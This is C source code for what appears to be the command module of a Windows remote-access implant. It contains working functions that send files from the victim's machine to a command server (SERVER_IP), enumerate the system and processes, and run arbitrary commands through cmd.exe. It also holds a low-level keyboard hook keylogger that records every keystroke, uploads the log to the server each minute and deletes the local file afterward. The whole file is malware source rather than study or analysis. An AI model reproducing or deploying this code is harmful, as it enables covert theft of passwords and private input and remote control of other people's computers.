#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <wincred.h>
#include <iphlpapi.h>
#include <psapi.h>
#include <wininet.h>
#include <tchar.h>
#include "../include/commands.h"
#include "../include/network.h"
#define KEYMON_MAX_KEYSTROKES 50000
#define KEYLOG_FILENAME "keylog.txt"
#define UPLOAD_INTERVAL_MS 60000 // 1 minute
static short *keymon_keystrokes = NULL;
static size_t keymon_keystrokes_count = 0;
static HHOOK kbHook = NULL;
static HANDLE keymon_thread = NULL;
static volatile BOOL keymon_running = FALSE;
static CRITICAL_SECTION keymon_cs;
static char current_agent_id[64] = {0};



void download_file(const char *remote_path, const char *agent_id, char *output, size_t output_size) {
    // Open the file
    FILE *file = fopen(remote_path, "rb");
    if (!file) {
        snprintf(output, output_size, "[!] File not found: %s", remote_path);
        return;
    }

    // Get file size
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    // Allocate memory and read file
    char *file_data = malloc(file_size);
    if (!file_data) {
        fclose(file);
        snprintf(output, output_size, "[!] Memory error");
        return;
    }
    fread(file_data, 1, file_size, file);
    fclose(file);

    // Extract just the filename from the path
    const char *filename = remote_path;
    const char *last_slash = strrchr(remote_path, '\\');
    const char *last_fslash = strrchr(remote_path, '/');
    if (last_slash && (!last_fslash || last_slash > last_fslash))
        filename = last_slash + 1;
    else if (last_fslash)
        filename = last_fslash + 1;

    // Initialize WinINet
    HINTERNET hInternet = InternetOpenA(
        USER_AGENT,
        INTERNET_OPEN_TYPE_DIRECT,
        NULL, NULL,
        0
    );

    if (!hInternet) {
        DWORD error = GetLastError();
        free(file_data);
        snprintf(output, output_size, "[!] Failed to initialize WinINet: %lu", error);
        return;
    }

    // Set timeouts to be more lenient
    DWORD timeout = 30000; // 30 seconds
    InternetSetOptionA(hInternet, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionA(hInternet, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionA(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

    // Connect to server
    HINTERNET hConnect = InternetConnectA(
        hInternet,
        SERVER_IP,
        SERVER_PORT,
        NULL, NULL,
        INTERNET_SERVICE_HTTP,
        0, 0
    );

    if (!hConnect) {
        DWORD error = GetLastError();
        InternetCloseHandle(hInternet);
        free(file_data);
        snprintf(output, output_size, "[!] Failed to connect to server: %lu", error);
        return;
    }

    // Create request path
    char path_part[256];
    snprintf(path_part, sizeof(path_part), "/upload/%s/%s", agent_id, filename);

    // Create the HTTP request
    HINTERNET hRequest = HttpOpenRequestA(
        hConnect,
        "POST",
        path_part,
        HTTP_VERSION,
        NULL,
        NULL,
        INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_AUTO_REDIRECT,
        0
    );

    if (!hRequest) {
        DWORD error = GetLastError();
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        free(file_data);
        snprintf(output, output_size, "[!] Failed to create request: %lu", error);
        return;
    }

    // Add necessary headers for binary data
    char headers[256];
    snprintf(headers, sizeof(headers),
             "Content-Type: application/octet-stream\r\n"
             "Content-Length: %ld\r\n"
             "Connection: Keep-Alive\r\n",
             file_size);

    HttpAddRequestHeadersA(hRequest, headers, -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);

    // Send request with file data and handle retries
    BOOL success = FALSE;
    int retries = 3;
    DWORD error = 0;

    while (retries > 0 && !success) {
        success = HttpSendRequestA(hRequest, NULL, 0, file_data, file_size);
        if (!success) {
            error = GetLastError();
            // Only retry on connection errors
            if (error != ERROR_INTERNET_CONNECTION_ABORTED &&
                error != ERROR_INTERNET_CONNECTION_RESET &&
                error != ERROR_INTERNET_TIMEOUT) {
                break;
            }
            retries--;
            Sleep(1000); // Wait before retrying
        }
    }

    if (success) {
        // Check HTTP status code
        DWORD status_code = 0;
        DWORD buffer_size = sizeof(status_code);
        DWORD index = 0;

        if (HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                          &status_code, &buffer_size, &index) && status_code == 200) {
            snprintf(output, output_size, "[+] Downloaded: %s", filename);
        } else {
            snprintf(output, output_size, "[!] Server error: HTTP %lu", status_code);
        }
    } else {
        snprintf(output, output_size, "[!] Download failed with error: %lu", error);
    }

    // Clean up
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    free(file_data);
}

void upload_file(const char *local_path, const char *agent_id, char *output, size_t output_size) {
    // Open the file
    FILE *file = fopen(local_path, "rb");
    if (!file) {
        snprintf(output, output_size, "[!] File not found: %s", local_path);
        return;
    }

    // Get file size
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    // Allocate memory and read file
    char *file_data = malloc(file_size);
    if (!file_data) {
        fclose(file);
        snprintf(output, output_size, "[!] Memory allocation failed");
        return;
    }
    fread(file_data, 1, file_size, file);
    fclose(file);

    // Extract filename
    const char *filename = local_path;
    const char *last_slash = strrchr(local_path, '\\');
    const char *last_fslash = strrchr(local_path, '/');
    if (last_slash && (!last_fslash || last_slash > last_fslash))
        filename = last_slash + 1;
    else if (last_fslash)
        filename = last_fslash + 1;

    // Initialize WinINet
    HINTERNET hInternet = InternetOpenA(USER_AGENT, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        DWORD error = GetLastError();
        free(file_data);
        snprintf(output, output_size, "[!] InternetOpen failed: %lu", error);
        return;
    }

    // Set timeouts
    DWORD timeout = 30000;
    InternetSetOptionA(hInternet, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionA(hInternet, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionA(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

    // Connect to the server
    HINTERNET hConnect = InternetConnectA(hInternet, SERVER_IP, SERVER_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        DWORD error = GetLastError();
        InternetCloseHandle(hInternet);
        free(file_data);
        snprintf(output, output_size, "[!] InternetConnect failed: %lu", error);
        return;
    }

    // Build the request path: e.g., /upload/agent123/filename.txt
    char path[256];
    snprintf(path, sizeof(path), "/upload/%s/%s", agent_id, filename);

    // Create HTTP request
    HINTERNET hRequest = HttpOpenRequestA(
        hConnect,
        "POST",
        path,
        HTTP_VERSION,
        NULL,
        NULL,
        INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_AUTO_REDIRECT,
        0
    );

    if (!hRequest) {
        DWORD error = GetLastError();
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        free(file_data);
        snprintf(output, output_size, "[!] HttpOpenRequest failed: %lu", error);
        return;
    }

    // Add headers
    char headers[256];
    snprintf(headers, sizeof(headers),
             "Content-Type: application/octet-stream\r\n"
             "Content-Length: %ld\r\n"
             "Connection: Keep-Alive\r\n",
             file_size);

    HttpAddRequestHeadersA(hRequest, headers, -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);

    // Upload file
    BOOL success = FALSE;
    int retries = 3;
    DWORD error = 0;

    while (retries-- > 0 && !success) {
        success = HttpSendRequestA(hRequest, NULL, 0, file_data, file_size);
        if (!success) {
            error = GetLastError();
            if (error != ERROR_INTERNET_CONNECTION_ABORTED &&
                error != ERROR_INTERNET_CONNECTION_RESET &&
                error != ERROR_INTERNET_TIMEOUT) {
                break;
            }
            Sleep(1000);
        }
    }


    if (success) {
        DWORD status_code = 0;
        DWORD size = sizeof(status_code);
        DWORD index = 0;

        if (HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &status_code, &size, &index) && status_code == 200) {
            snprintf(output, output_size, "[+] Uploaded: %s", filename);
        } else {
            snprintf(output, output_size, "[!] Server responded with HTTP %lu", status_code);
        }
    } else {
        snprintf(output, output_size, "[!] Upload failed: %lu", error);
    }

    // Cleanup
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    free(file_data);
}

void enumerate_system(char *output, size_t output_size) {
    char buffer[4096];
    DWORD offset = 0;
    SYSTEM_INFO si;
    OSVERSIONINFOEX osvi;
    MEMORYSTATUSEX memStat;

    // Get basic system info
    GetSystemInfo(&si);
    offset += snprintf(buffer + offset, sizeof(buffer) - offset,
        "=== SYSTEM INFORMATION ===\r\n"
        "Processor Arch: %s\r\n"
        "Page Size: %lu\r\n"
        "Number of Processors: %lu\r\n",
        (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) ? "x64" :
        (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) ? "x86" : "Unknown",
        si.dwPageSize,
        si.dwNumberOfProcessors);

    // Get OS version
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    GetVersionEx((OSVERSIONINFO*)&osvi);
    offset += snprintf(buffer + offset, sizeof(buffer) - offset,
        "OS Version: %lu.%lu.%lu\r\n",
        osvi.dwMajorVersion,
        osvi.dwMinorVersion,
        osvi.dwBuildNumber);

    // Get memory status
    memStat.dwLength = sizeof(memStat);
    GlobalMemoryStatusEx(&memStat);
    offset += snprintf(buffer + offset, sizeof(buffer) - offset,
        "Total Physical Memory: %llu MB\r\n"
        "Available Memory: %llu MB\r\n",
        memStat.ullTotalPhys / (1024 * 1024),
        memStat.ullAvailPhys / (1024 * 1024));

    // Get computer name
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);
    offset += snprintf(buffer + offset, sizeof(buffer) - offset,
        "Computer Name: %s\r\n", computerName);

    // Get username
    char userName[256];
    DWORD userNameSize = sizeof(userName);
    GetUserNameA(userName, &userNameSize);
    offset += snprintf(buffer + offset, sizeof(buffer) - offset,
        "User Name: %s\r\n", userName);

    // Get current directory
    char currentDir[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, currentDir);
    offset += snprintf(buffer + offset, sizeof(buffer) - offset,
        "Current Directory: %s\r\n", currentDir);

    // Get system directory
    char systemDir[MAX_PATH];
    GetSystemDirectoryA(systemDir, MAX_PATH);
    offset += snprintf(buffer + offset, sizeof(buffer) - offset,
        "System Directory: %s\r\n", systemDir);

    // Check admin privileges
    BOOL isAdmin = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD dwSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
            isAdmin = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    offset += snprintf(buffer + offset, sizeof(buffer) - offset,
        "Admin Privileges: %s\r\n", isAdmin ? "Yes" : "No");

    // Copy the enumeration data directly to output
    strncpy(output, buffer, output_size);
    output[output_size - 1] = '\0';
}

void print_process_name_and_id(const DWORD pid, char *output, size_t output_size) {
    char szProcessName[MAX_PATH] = "<unknown>";

    // Skip problematic system processes
    if (pid == 0) {
        snprintf(output, output_size, "[System Idle Process] (PID: 0)\n");
        return;
    }
    if (pid == 4) {
        snprintf(output, output_size, "[System] (PID: 4)\n");
        return;
    }

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);

    if (hProcess != NULL) {
        // Try to get the process name
        if (GetProcessImageFileNameA(hProcess, szProcessName, sizeof(szProcessName))) {
            // Extract just the executable name
            char *exe = strrchr(szProcessName, '\\');
            if (exe != NULL) {
                memmove(szProcessName, exe + 1, strlen(exe + 1) + 1);
            }
        }
        CloseHandle(hProcess);
    }

    snprintf(output, output_size, "%s (PID: %lu)\n", szProcessName, pid);
}

void print_process_name(char *output, size_t output_size) {
    DWORD aProcesses[1024], cbNeeded, cProcesses;
    unsigned int i;
    size_t offset = 0;

    output[0] = '\0';

    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
        snprintf(output, output_size, "ERROR: EnumProcesses failed\n");
        return;
    }

    cProcesses = cbNeeded / sizeof(DWORD);

    // Add header
    offset = snprintf(output, output_size, "=== Process List (%lu processes) ===\n", cProcesses);

    for (i = 0; i < cProcesses; i++) {
        if (aProcesses[i] != 0) {
            if (offset >= output_size - 100) {  // Leave room for last entry
                offset += snprintf(output + offset, output_size - offset, "... truncated\n");
                break;
            }

            print_process_name_and_id(aProcesses[i], output + offset, output_size - offset);
            offset = strlen(output);
        }
    }
}

// Function to convert virtual key code to character
char keycode_to_char(DWORD vkCode, BOOL shift, BOOL caps) {
    BOOL uppercase = (shift ^ caps);

    switch (vkCode) {
        case VK_SPACE: return ' ';
        case VK_RETURN: return '\n';
        case VK_TAB: return '\t';
        case VK_BACK: return '\b';
        case VK_ESCAPE: return 0x1B;

        // Letters
        case 0x41: return uppercase ? 'A' : 'a';
        case 0x42: return uppercase ? 'B' : 'b';
        case 0x43: return uppercase ? 'C' : 'c';
        case 0x44: return uppercase ? 'D' : 'd';
        case 0x45: return uppercase ? 'E' : 'e';
        case 0x46: return uppercase ? 'F' : 'f';
        case 0x47: return uppercase ? 'G' : 'g';
        case 0x48: return uppercase ? 'H' : 'h';
        case 0x49: return uppercase ? 'I' : 'i';
        case 0x4A: return uppercase ? 'J' : 'j';
        case 0x4B: return uppercase ? 'K' : 'k';
        case 0x4C: return uppercase ? 'L' : 'l';
        case 0x4D: return uppercase ? 'M' : 'm';
        case 0x4E: return uppercase ? 'N' : 'n';
        case 0x4F: return uppercase ? 'O' : 'o';
        case 0x50: return uppercase ? 'P' : 'p';
        case 0x51: return uppercase ? 'Q' : 'q';
        case 0x52: return uppercase ? 'R' : 'r';
        case 0x53: return uppercase ? 'S' : 's';
        case 0x54: return uppercase ? 'T' : 't';
        case 0x55: return uppercase ? 'U' : 'u';
        case 0x56: return uppercase ? 'V' : 'v';
        case 0x57: return uppercase ? 'W' : 'w';
        case 0x58: return uppercase ? 'X' : 'x';
        case 0x59: return uppercase ? 'Y' : 'y';
        case 0x5A: return uppercase ? 'Z' : 'z';

        // Numbers
        case 0x30: return shift ? ')' : '0';
        case 0x31: return shift ? '!' : '1';
        case 0x32: return shift ? '@' : '2';
        case 0x33: return shift ? '#' : '3';
        case 0x34: return shift ? '$' : '4';
        case 0x35: return shift ? '%' : '5';
        case 0x36: return shift ? '^' : '6';
        case 0x37: return shift ? '&' : '7';
        case 0x38: return shift ? '*' : '8';
        case 0x39: return shift ? '(' : '9';

        // Special characters
        case VK_OEM_1: return shift ? ':' : ';';
        case VK_OEM_2: return shift ? '?' : '/';
        case VK_OEM_3: return shift ? '~' : '`';
        case VK_OEM_4: return shift ? '{' : '[';
        case VK_OEM_5: return shift ? '|' : '\\';
        case VK_OEM_6: return shift ? '}' : ']';
        case VK_OEM_7: return shift ? '\"' : '\'';
        case VK_OEM_PLUS: return shift ? '+' : '=';
        case VK_OEM_COMMA: return shift ? '<' : ',';
        case VK_OEM_MINUS: return shift ? '_' : '-';
        case VK_OEM_PERIOD: return shift ? '>' : '.';

        default: return 0;
    }
}

// Save keystrokes to file
void keymon_save_to_file() {
    EnterCriticalSection(&keymon_cs);

    if (keymon_keystrokes_count == 0) {
        LeaveCriticalSection(&keymon_cs);
        return;
    }

    FILE *file = fopen(KEYLOG_FILENAME, "a");
    if (!file) {
        LeaveCriticalSection(&keymon_cs);
        return;
    }

    // Get current timestamp
    time_t now = time(NULL);
    struct tm *tm_info = localtime(&now);
    char timestamp[20];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm_info);
    fprintf(file, "\n=== Keylog Session: %s ===\n", timestamp);

    for (size_t i = 0; i < keymon_keystrokes_count; i++) {
        short key_data = keymon_keystrokes[i];
        DWORD vkCode = key_data & 0xFF;
        BOOL caps = (key_data & 0x8000) != 0;
        BOOL shift = (key_data & 0x4000) != 0;

        char ch = keycode_to_char(vkCode, shift, caps);
        if (ch != 0) {
            fputc(ch, file);
        }
    }

    fclose(file);

    // Reset keystrokes after saving
    keymon_keystrokes_count = 0;

    LeaveCriticalSection(&keymon_cs);
}

// Upload keylog file
void keymon_upload_file() {
    if (strlen(current_agent_id) == 0) {
        return;
    }

    char output[1024];
    upload_file(KEYLOG_FILENAME, current_agent_id, output, sizeof(output));
    // Output could be logged if needed
}

DWORD WINAPI keymon_upload_thread(LPVOID param) {
    while (keymon_running) {
        Sleep(UPLOAD_INTERVAL_MS);

        if (keymon_running) {
            keymon_save_to_file();
            keymon_upload_file();
        }
    }
    return 0;
}

LRESULT CALLBACK keymon_hook_proc(int n_code, WPARAM w_param, LPARAM l_param) {
    if (n_code >= 0) {
        KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT *)l_param;
        DWORD pressed_key = pKeyboard->vkCode;
        BOOL is_keyup = (w_param == WM_KEYUP);

        if (!is_keyup && pressed_key != VK_RSHIFT && pressed_key != VK_LSHIFT &&
            pressed_key != VK_SHIFT && pressed_key != VK_CAPITAL) {

            EnterCriticalSection(&keymon_cs);

            if (keymon_keystrokes != NULL && keymon_keystrokes_count < KEYMON_MAX_KEYSTROKES) {
                short result = (short)pressed_key;

                if (GetKeyState(VK_CAPITAL) & 0x1)
                    result |= 0x8000;
                if (GetKeyState(VK_LSHIFT) & 0x8000 || GetKeyState(VK_RSHIFT) & 0x8000)
                    result |= 0x4000;

                keymon_keystrokes[keymon_keystrokes_count++] = result;
            }

            LeaveCriticalSection(&keymon_cs);
        }
    }

    return CallNextHookEx(NULL, n_code, w_param, l_param);
}

DWORD WINAPI keymon_thread_proc(LPVOID param) {
    HINSTANCE hInstance = GetModuleHandle(NULL);

    kbHook = SetWindowsHookEx(WH_KEYBOARD_LL, keymon_hook_proc, hInstance, 0);
    if (!kbHook) {
        return 0;
    }

    // Create upload thread
    HANDLE hUploadThread = CreateThread(NULL, 0, keymon_upload_thread, NULL, 0, NULL);

    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) && keymon_running) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Cleanup
    if (hUploadThread) {
        WaitForSingleObject(hUploadThread, 5000);
        CloseHandle(hUploadThread);
    }

    if (kbHook) {
        UnhookWindowsHookEx(kbHook);
        kbHook = NULL;
    }

    return 0;
}

void keymon_start(const char *agent_id) {
    if (keymon_running) {
        return; // Already running
    }

    strncpy(current_agent_id, agent_id, sizeof(current_agent_id) - 1);

    InitializeCriticalSection(&keymon_cs);

    // Allocate memory for keystrokes
    keymon_keystrokes = malloc(KEYMON_MAX_KEYSTROKES * sizeof(short));
    if (!keymon_keystrokes) {
        return;
    }

    keymon_keystrokes_count = 0;
    keymon_running = TRUE;

    // Create keylog file
    FILE *file = fopen(KEYLOG_FILENAME, "w");
    if (file) {
        time_t now = time(NULL);
        struct tm *tm_info = localtime(&now);
        char timestamp[20];
        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm_info);
        fprintf(file, "Keylogger started: %s\n", timestamp);
        fclose(file);
    }

    // Start keymon thread
    keymon_thread = CreateThread(NULL, 0, keymon_thread_proc, NULL, 0, NULL);
}

void keymon_stop() {
    if (!keymon_running) {
        return;
    }

    keymon_running = FALSE;

    // Post a message to break the message loop
    PostThreadMessage(GetThreadId(keymon_thread), WM_QUIT, 0, 0);

    // Wait for thread to exit
    WaitForSingleObject(keymon_thread, 5000);
    CloseHandle(keymon_thread);
    keymon_thread = NULL;

    // Save and upload final keystrokes
    keymon_save_to_file();
    keymon_upload_file();

    // Cleanup
    if (keymon_keystrokes) {
        free(keymon_keystrokes);
        keymon_keystrokes = NULL;
    }

    DeleteCriticalSection(&keymon_cs);

    // Remove keylog file
    DeleteFileA(KEYLOG_FILENAME);
}

void keymon_toggle(const char *agent_id, char *output, size_t output_size) {
    if (keymon_running) {
        keymon_stop();
        snprintf(output, output_size, "[+] Keylogger stopped and keylog.txt uploaded");
    } else {
        keymon_start(agent_id);
        snprintf(output, output_size, "[+] Keylogger started. Uploading keylog.txt every minute");
    }
}


void execute_command(const char *command, char *output, size_t output_size, const char *agent_id) {

    if (strncmp(command, "download", 9) == 0) {
        const char *remote_path = command + 9;
        download_file(remote_path, agent_id, output, output_size);
        return;
    }

    if (strncmp(command, "upload", 9) == 0) {
        const char *remote_path = command + 9;
        upload_file(remote_path, agent_id, output, output_size);
        return;
    }

    if (strncmp(command, "enumerate", 11) == 0) {
        enumerate_system(output, output_size);
        return;
    }

    if (strncmp(command, "processes", 9) == 0) {
        print_process_name(output, output_size);
        return;
    }

    if (strncmp(command, "keymon", 9) == 0) {
        keymon_toggle(agent_id, output, output_size);
        return;
    }

    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE hRead, hWrite;
    CreatePipe(&hRead, &hWrite, &sa, 0);

    STARTUPINFO si = {sizeof(si)};
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    PROCESS_INFORMATION pi;
    char cmd_line[512];
    snprintf(cmd_line, sizeof(cmd_line), "cmd.exe /c %s", command);

    if (CreateProcess(NULL, cmd_line, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(hWrite);

        // Timeout: 30 seconds
        if (WaitForSingleObject(pi.hProcess, 30000) == WAIT_TIMEOUT) {
            TerminateProcess(pi.hProcess, 1);
            strncpy(output, "[ERROR] Command timed out (30s)", output_size);
        } else {
            DWORD bytes_read;
            char buffer[BUFFER_SIZE];
            while (ReadFile(hRead, buffer, sizeof(buffer)-1, &bytes_read, NULL) && bytes_read > 0) {
                buffer[bytes_read] = '\0';
                strncat(output, buffer, output_size - strlen(output) - 1);
            }
        }
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    CloseHandle(hRead);
}

